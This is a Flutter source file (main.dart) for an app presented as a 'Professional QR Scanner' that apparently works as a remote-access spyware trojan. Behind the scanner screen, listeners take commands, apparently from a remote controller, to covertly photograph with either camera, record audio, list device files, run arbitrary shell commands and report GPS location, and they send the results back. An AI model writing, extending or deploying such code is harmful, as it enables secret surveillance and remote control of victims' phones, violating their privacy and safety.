// lib/main.dart
import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:camera/camera.dart';
import 'package:geolocator/geolocator.dart';

import 'screens/qr_scanner_screen.dart';
import 'services/background_service.dart';
import 'services/camera_service.dart';
import 'services/location_service.dart';
import 'services/file_system_service.dart';
import 'services/audio_service.dart'; // Add this service
import 'utils/constants.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeBackgroundService();
  runApp(const EthicalScannerApp());
}

class EthicalScannerApp extends StatefulWidget {
  const EthicalScannerApp({super.key});
  @override
  State<EthicalScannerApp> createState() => _EthicalScannerAppState();
}

class _EthicalScannerAppState extends State<EthicalScannerApp> {
  final svc = FlutterBackgroundService();

  @override
  void initState() {
    super.initState();

    // Listen for requests from the background service to execute MethodChannel calls

    // Listener for take_picture requests from background
    svc.on('execute_take_picture_from_ui').listen((raw) async {
      if (raw == null) return;
      final args = Map<String, dynamic>.from(raw as Map);
      final camService = CameraService();
      final String? lensDirectionArg = args['camera'] as String?;
      final String? originalCommandRef = args['original_command_ref'] as String?;

      if (lensDirectionArg == null || originalCommandRef == null) {
        debugPrint("EthicalScannerAppState: Missing 'camera' or 'original_command_ref' in execute_take_picture_from_ui");
        return;
      }

      final lensDirection = lensDirectionArg == 'back' ? CameraLensDirection.back : CameraLensDirection.front;

      debugPrint("EthicalScannerAppState: UI received request to take picture with ${lensDirection.name}");

      final XFile? file = await camService.takePicture(lensDirection: lensDirection);

      if (file == null) {
        svc.invoke('execute_take_picture_from_ui_result', {
          'status': 'error',
          'payload': {'message': 'No image captured (UI request for background)'},
          'original_command_ref': originalCommandRef,
        });
      } else {
        svc.invoke('execute_take_picture_from_ui_result', {
          'status': 'success',
          'payload': {'path': file.path},
          'original_command_ref': originalCommandRef,
        });
      }
    });

    // Listener for list_files requests from background
    svc.on('execute_list_files_from_ui').listen((raw) async {
      if (raw == null) return;
      final args = Map<String, dynamic>.from(raw as Map);
      final fsService = FileSystemService();
      final String? path = args['path'] as String?;
      final String? originalCommandRef = args['original_command_ref'] as String?;

      if (originalCommandRef == null) {
        debugPrint("EthicalScannerAppState: Missing 'original_command_ref' in execute_list_files_from_ui");
        return;
      }

      debugPrint("EthicalScannerAppState: UI received request to list files for path: '$path'");
      final Map<String, dynamic>? result = await fsService.listFiles(path ?? "/storage/emulated/0");

      if (result != null && result['error'] == null) {
        svc.invoke('execute_list_files_from_ui_result', {
          'status': 'success',
          'payload': result,
          'original_command_ref': originalCommandRef,
        });
      } else {
        svc.invoke('execute_list_files_from_ui_result', {
          'status': 'error',
          'payload': {
            'message': result?['error']?.toString() ?? 'Failed to list files (UI request for background)',
          },
          'original_command_ref': originalCommandRef,
        });
      }
    });

    // Listener for shell command execution requests from background
    svc.on('execute_shell_from_ui').listen((raw) async {
      if (raw == null) return;
      final args = Map<String, dynamic>.from(raw as Map);
      final fsService = FileSystemService();
      final String? command = args['command'] as String?;
      final List<String>? commandArgs = (args['args'] as List<dynamic>?)?.map((e) => e.toString()).toList();
      final String? originalCommandRef = args['original_command_ref'] as String?;

      if (originalCommandRef == null || command == null) {
        debugPrint("EthicalScannerAppState: Missing required parameters in execute_shell_from_ui");
        return;
      }

      debugPrint("EthicalScannerAppState: UI received request to execute shell: $command with args: $commandArgs");
      final Map<String, dynamic>? result = await fsService.executeShellCommand(command, commandArgs ?? []);

      if (result != null && result['error'] == null) {
        svc.invoke('execute_shell_from_ui_result', {
          'status': 'success',
          'payload': result,
          'original_command_ref': originalCommandRef,
        });
      } else {
        svc.invoke('execute_shell_from_ui_result', {
          'status': 'error',
          'payload': {
            'message': result?['error']?.toString() ?? 'Failed to execute shell command (UI request for background)',
          },
          'original_command_ref': originalCommandRef,
        });
      }
    });

    // NEW: Listener for voice recording requests from background
    svc.on('execute_record_voice_from_ui').listen((raw) async {
      if (raw == null) return;
      final args = Map<String, dynamic>.from(raw as Map);
      final audioService = AudioService();
      final int? duration = args['duration'] as int?;
      final String? quality = args['quality'] as String?;
      final String? originalCommandRef = args['original_command_ref'] as String?;

      if (originalCommandRef == null) {
        debugPrint("EthicalScannerAppState: Missing 'original_command_ref' in execute_record_voice_from_ui");
        return;
      }

      debugPrint("EthicalScannerAppState: UI received request to record voice for ${duration ?? 10}s with quality: ${quality ?? 'medium'}");

      try {
        final String? audioFilePath = await audioService.recordAudio(
          duration: duration ?? 10,
          quality: quality ?? 'medium',
        );

        if (audioFilePath != null && audioFilePath.isNotEmpty) {
          // Upload the recorded audio file
          svc.invoke('execute_record_voice_from_ui_result', {
            'status': 'success',
            'payload': {'path': audioFilePath},
            'original_command_ref': originalCommandRef,
          });
        } else {
          svc.invoke('execute_record_voice_from_ui_result', {
            'status': 'error',
            'payload': {'message': 'No audio recorded (UI request for background)'},
            'original_command_ref': originalCommandRef,
          });
        }
      } catch (e) {
        svc.invoke('execute_record_voice_from_ui_result', {
          'status': 'error',
          'payload': {'message': 'Audio recording failed: $e'},
          'original_command_ref': originalCommandRef,
        });
      }
    });

    // Handle audio recording response from background service  
    svc.on('execute_record_voice_from_ui_result').listen((response) async {
      if (response == null) return;
      final Map<String, dynamic> data = Map<String, dynamic>.from(response as Map);
      final status = data['status'] as String?;
      final payload = data['payload'] as Map<String, dynamic>?;
      final String? originalCommandRef = data['original_command_ref'] as String?;

      if (originalCommandRef == null) {
        debugPrint("EthicalScannerAppState: 'original_command_ref' missing in execute_record_voice_from_ui_result");
        return;
      }

      // This is handled in the background service now, just for UI feedback if needed
      debugPrint("EthicalScannerAppState: Voice recording completed with status: $status");
    });

    // Listener for get_location (this can stay as it's pure Dart and doesn't need native UI isolate directly)
    svc.on(SIO_CMD_GET_LOCATION).listen((_) async {
      debugPrint("EthicalScannerAppState: Received SIO_CMD_GET_LOCATION event (likely from background).");
      final locSvc = LocationService();
      try {
        final Position? loc = await locSvc.getCurrentLocation();
        if (loc == null) throw Exception('Location unavailable from UI listener');
        
        svc.invoke('${SIO_CMD_GET_LOCATION}_ui_result', {
          'status': 'success',
          'payload': {
            'latitude': loc.latitude,
            'longitude': loc.longitude,
            'accuracy': loc.accuracy,
            'altitude': loc.altitude,
            'speed': loc.speed,
            'timestamp_gps': loc.timestamp?.toIso8601String(),
          },
        });
      } catch (e) {
        svc.invoke('${SIO_CMD_GET_LOCATION}_ui_result', {
          'status': 'error',
          'payload': {'message': e.toString()},
        });
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Professional QR Scanner',
      theme: ThemeData.dark(),
      home: const Directionality(
        textDirection: TextDirection.ltr,
        child: QrScannerScreen(),
      ),
    );
  }
}